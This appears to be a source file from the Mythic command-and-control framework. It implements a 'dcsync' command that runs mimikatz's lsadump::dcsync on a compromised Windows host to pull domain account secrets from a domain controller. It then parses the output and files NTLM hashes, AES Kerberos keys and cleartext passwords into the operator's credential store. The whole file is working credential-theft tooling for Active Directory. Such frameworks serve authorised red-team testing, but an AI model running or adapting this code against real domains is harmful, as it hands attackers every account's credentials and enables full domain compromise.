from mythic_container.MythicCommandBase import *
from os import path
from mythic_container.MythicRPC import *
# Import the credential-create classes by module: the star imports also bind the credential-search module's
# MythicRPCCredentialData, which takes different (snake_case) arguments.
from mythic_container.MythicGoRPC import send_mythic_rpc_credential_create as credential_create
import mslex
import re
from .execute_pe import *


class DcSyncArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Domain to sync credentials from.",
                parameter_group_info=[ParameterGroupInfo(ui_position=1, required=True)],
            ),
            CommandParameter(
                name="user",
                cli_name="User",
                display_name="User",
                default_value="all",
                type=ParameterType.String,
                description="Username to sync. Defaults to all.",
                parameter_group_info=[
                    ParameterGroupInfo(ui_position=2, required=False)
                ],
            ),
            CommandParameter(
                name="dc",
                cli_name="DC",
                display_name="DC",
                type=ParameterType.String,
                description="Domain controller to sync credential material from.",
                parameter_group_info=[
                    ParameterGroupInfo(ui_position=3, required=False)
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)

            arguments = "/domain:{}".format(self.get_arg("domain"))

            if self.get_arg("dc"):
                arguments += " /dc:{}".format(self.get_arg("dc"))
            if self.get_arg("user") != "all":
                arguments += " /user:{}".format(self.get_arg("user"))
            else:
                arguments += " /all"

            self.add_arg("arguments", arguments)
        else:
            raise Exception(
                "No mimikatz command given to execute.\n\tUsage: {}".format(
                    DcSyncCommand.help_cmd
                )
            )


# mimikatz lsadump::dcsync output lines (kuhl_m_lsadump_dc.c), matched by label rather than by line offset:
# which optional lines appear depends on the account and on /all, which requests fewer attributes.
_DCSYNC_DOMAIN = re.compile(r"^\[DC\] '(?P<value>[^']+)' will be the domain$")
_DCSYNC_SAM_USERNAME = re.compile(r"^SAM Username\s+: (?P<value>.+)$")
_DCSYNC_HASH_NTLM = re.compile(r"^  Hash NTLM: (?P<value>\S+)$")
_DCSYNC_PROPERTY = re.compile(r"^\* (?P<value>.+) \*$")
_DCSYNC_KEY_LIST = re.compile(r"^    (?P<value>Credentials|ServiceCredentials|OldCredentials|OlderCredentials)$")
_DCSYNC_KEY = re.compile(r"^      (?P<etype>\S+)\s+\(\d+\) : (?P<value>\S+)$")
# Current Kerberos keys registered, with their hex length. des_cbc_md5 and the service, old and older key lists
# are not registered.
_DCSYNC_KEY_LENGTHS = {"aes256_hmac": 64, "aes128_hmac": 32}
_DCSYNC_CLEARTEXT_INDENT = "    "


def _is_hex(value: str, length: int) -> bool:
    return len(value) == length and re.fullmatch(r"[0-9A-Fa-f]+", value) is not None


def parse_dcsync_output(text: str) -> list:
    """Return the credentials in mimikatz lsadump::dcsync output, one dict per value.

    Each dict has credential_type, account, realm, credential and field (the output label it came from). The
    account is the object's SAM Username and the realm is the domain from "[DC] '<domain>' will be the domain".
    Registered per account: Hash NTLM (hash), the current aes256_hmac and aes128_hmac keys from
    Primary:Kerberos-Newer-Keys (key), and Primary:CLEARTEXT (plaintext). Password history, LM hashes, other key
    lists and other properties are not returned. Values with the wrong length or format are skipped.
    """
    rows = []
    seen = set()
    realm = ""
    account = None
    prop = None
    key_list = None
    cleartext_next = False

    def add(credential_type, credential, field):
        row = (credential_type, account, realm, credential)
        if row not in seen:
            seen.add(row)
            rows.append({"credential_type": credential_type, "account": account, "realm": realm,
                         "credential": credential, "field": field})

    for line in text.replace("\r\n", "\n").split("\n"):
        if cleartext_next:
            # Primary:CLEARTEXT prints its value on the next line, indented four spaces.
            cleartext_next = False
            if account and line.startswith(_DCSYNC_CLEARTEXT_INDENT) and len(line) > len(_DCSYNC_CLEARTEXT_INDENT):
                add("plaintext", line[len(_DCSYNC_CLEARTEXT_INDENT):], "Primary:CLEARTEXT")
            continue
        match = _DCSYNC_DOMAIN.match(line)
        if match:
            realm = match.group("value")
            continue
        if line.startswith("Object RDN "):
            # A new directory object: nothing carries over from the previous one.
            account, prop, key_list = None, None, None
            continue
        match = _DCSYNC_SAM_USERNAME.match(line)
        if match:
            account = match.group("value").strip()
            continue
        if not account:
            continue
        match = _DCSYNC_HASH_NTLM.match(line)
        if match:
            if _is_hex(match.group("value"), 32):
                add("hash", match.group("value"), "Hash NTLM")
            continue
        match = _DCSYNC_PROPERTY.match(line)
        if match:
            prop, key_list = match.group("value"), None
            cleartext_next = prop == "Primary:CLEARTEXT"
            continue
        if prop != "Primary:Kerberos-Newer-Keys":
            continue
        match = _DCSYNC_KEY_LIST.match(line)
        if match:
            key_list = match.group("value")
            continue
        match = _DCSYNC_KEY.match(line)
        if match and key_list == "Credentials":
            etype, value = match.group("etype"), match.group("value")
            if etype in _DCSYNC_KEY_LENGTHS and _is_hex(value, _DCSYNC_KEY_LENGTHS[etype]):
                add("key", value, etype)
    return rows


async def parse_credentials_dcsync(
    task: PTTaskCompletionFunctionMessage,
) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(
        Success=True, TaskStatus="success", Completed=True
    )
    responses = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID)
    )
    if not responses.Success:
        raise Exception("Failed to read dcsync output: {}".format(responses.Error))
    # Mythic returns the newest response first, and a line can span two responses: rejoin them in order.
    output = "".join(
        str(r.Response) for r in sorted(responses.Responses, key=lambda r: r.ResponseID)
    )
    rows = parse_dcsync_output(output)
    if not rows:
        return response
    cred_resp = await credential_create.SendMythicRPCCredentialCreate(
        credential_create.MythicRPCCredentialCreateMessage(
            TaskID=task.TaskData.Task.ID,
            Credentials=[
                credential_create.MythicRPCCredentialData(
                    CredentialType=row["credential_type"],
                    Account=row["account"],
                    Realm=row["realm"],
                    Credential=row["credential"],
                    Comment="dcsync {} (task {})".format(row["field"], task.TaskData.Task.DisplayID),
                )
                for row in rows
            ],
        )
    )
    if not cred_resp.Success:
        raise Exception("Failed to register dcsync credentials: {}".format(cred_resp.Error))
    return response


class DcSyncCommand(CommandBase):
    cmd = "dcsync"
    attributes = CommandAttributes(dependencies=["execute_pe"], alias=True)
    needs_admin = False
    help_cmd = "dcsync -Domain [domain] -User [user]"
    description = "Sync a user's Kerberos keys to the local machine."
    version = 4
    author = "@djhohnstein"
    argument_class = DcSyncArguments
    attackmapping = ["T1003.006"]
    script_only = False
    completion_functions = {"parse_credentials_dcsync": parse_credentials_dcsync}

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:

        arguments = taskData.args.get_arg("arguments")

        arguments = "lsadump::dcsync " + arguments
        executePEArgs = ExecutePEArguments(command_line=json.dumps({
            "pe_name": "mimikatz.exe",
            "pe_arguments": mslex.quote(arguments, for_cmd = False),
        }))
        await executePEArgs.parse_arguments()
        executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
                                            agent_code_path=self.agent_code_path,
                                            agent_browserscript_path=self.agent_browserscript_path)
        # set our taskData args to be the new ones for execute_pe
        taskData.args = executePEArgs
        # executePE's creat_go_tasking function returns a response for us
        newResp = await executePECommand.create_go_tasking(taskData=taskData)
        # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
        newResp.CommandName = "execute_pe"
        newResp.DisplayParams = arguments
        newResp.CompletionFunctionName = "parse_credentials_dcsync"
        return newResp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
